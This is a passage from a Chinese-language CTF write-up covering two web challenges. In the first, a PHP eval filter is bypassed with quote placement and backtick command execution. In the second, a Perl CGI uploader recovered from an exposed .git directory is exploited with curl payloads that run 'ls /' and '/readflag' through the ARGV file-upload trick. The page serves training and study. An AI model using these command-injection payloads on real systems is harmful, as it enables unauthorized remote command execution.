<span class="nb">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</pre></div>


<p>剛開始沒發現flag，跑到4萬多s變成N/A，後來才發現，於是又重跑，最後在17332的地方出現flag
出題者真是有夠壞</p>
<h2 id="web3">Web3</h2>
<p>Sushi</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="c1">// PHP is the best language for hacker</span>
<span class="c1">// Find the flag !!</span>
<span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<span class="nv">$_</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;??&#39;</span><span class="p">];</span>

<span class="k">if</span><span class="p">(</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$_</span><span class="p">,</span> <span class="s1">&#39;&quot;&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$_</span><span class="p">,</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">)</span> <span class="p">)</span> 
    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Bad Hacker :(&#39;</span><span class="p">);</span>

<span class="k">eval</span><span class="p">(</span><span class="s1">&#39;die(&quot;&#39;</span> <span class="o">.</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$_</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&quot;);&#39;</span><span class="p">);</span>
</pre></div>


<p>隨便亂試後發現<code>"</code>或<code>'</code>只要在整個字串的第一個出現過，後面再出現，就不會被擋掉，原因是<code>strpos</code>是找出該字串第一次出現的位置，而這麼做第一次出現的位置便會是0，然後<code>if</code>這樣寫就會當成<code>false</code>
於是就先生出這樣:<code>".exec("ls")."</code>，然後發現<code>phpinfo.php</code>，想說會在其他目錄，但是想要找其他目錄指令會太長，所以又想了一下，可以把<code>exec</code>換成兩個反引號，變成<code>".‵ls‵."</code>，然後就跑出其他檔案，裡面就有flag，檔案是<code>flag_name_1s_t00_l0ng_QAQQQQQQ</code>，檔名太長，不能用cat，那就直接把檔名加在網址後就能看了
<code>exec</code>只看到<code>phpinfo.php</code>的原因是<code>exec</code>預設只會給出最後一行的輸出</p>
<h2 id="web4">Web4</h2>
<p>perljam
又是藏了.git
用Githack抓下來，發現一份檔案
index-b44be173b965d6bdc0b784b6797fac0a.cgi.bak</p>
<div class="codehilite"><pre><span></span><span class="x">#!/usr/bin/perl</span>
<span class="x"># My uploader!</span>
<span class="x">use strict;</span>
<span class="x">use warnings;</span>
<span class="x">use CGI;</span>
<span class="x">my $cgi = CGI-&gt;new;</span>
<span class="x">print $cgi-&gt;header();</span>
<span class="x">print &quot;&lt;body style=\&quot;background: #caccf7 url(&#39;https://i.imgur.com/Syv2IVk.png&#39;);padding: 30px;\&quot;&gt;&quot;;</span>
<span class="x">print &quot;&lt;p style=&#39;color:red&#39;&gt;No BUG Q_____Q&lt;/p&gt;&quot;;</span>
<span class="x">print &quot;&lt;br&gt;&quot;;</span>
<span class="x">print &quot;&lt;pre&gt;&quot;;</span>
<span class="x">if( $cgi-&gt;upload(&#39;file&#39;) ) {</span>
<span class="x">        my $file = $cgi-&gt;param(&#39;file&#39;);</span>
<span class="x">        while(&lt;$file&gt;) {</span>
<span class="x">                print &quot;$_&quot;;</span>
<span class="x">        }</span>
<span class="x">}</span>
<span class="x">print &quot;&lt;/pre&gt;&quot;;</span>
</pre></div>


<p>上網找一找，發現了
https://github.com/isislab/CSAW-CTF-2016-Quals/tree/master/Web/I%20Got%20Id
把payload改一下<br />
<code>echo "asdf" | curl -F "file=ARGV" -F "file=@-" "http://104.19135:31334/cgi-bin/index.cgi?ls /|"</code>
找到<code>readflag</code><br />
<code>echo "asdf" | curl -F "file=ARGV" -F "file=@-" "http://104.19135:31334/cgi-bin/index.cgi?/readflag|"</code>
執行<code>readflag</code>，flag就噴出來了</p>
                
                  
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../../../.." title="Home" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Home
              </span>
            </div>
          </a>
        
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
        
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../../assets/javascripts/application.a59e2a89.js"></script>
      
      <script>app.initialize({version:"0.17.5",url:{base:"../../../.."}})</script>
      
    
    
      
    
  </body>
</html>
